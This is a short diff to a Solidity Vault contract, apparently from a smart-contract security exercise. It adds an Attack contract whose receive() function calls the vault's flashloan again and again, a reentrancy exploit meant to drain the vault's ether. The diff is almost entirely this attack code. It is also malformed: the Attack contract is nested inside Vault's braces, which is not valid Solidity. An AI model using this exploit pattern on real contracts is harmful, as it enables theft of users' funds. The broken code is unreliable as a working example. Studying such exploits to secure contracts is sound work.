@@ -25,4 +25,22 @@ contract Vault {
         uint256 finalBalance = address(this).balance;
         require(finalBalance >= initialBalance, "Final balance lower than Initial balance");
     }
+
+    contract Attack {
+    Vault public vault;
+
+    constructor(address _vaultAddress) {
+        vault = Vault(_vaultAddress);
+    }
+
+    function attack() external payable {
+        vault.flashloan(1 ether);
+    }
+
+    receive() external payable {
+        if (address(vault).balance >= 1 ether) {
+            vault.flashloan(1 ether);
+        }
+    }
+}
 }
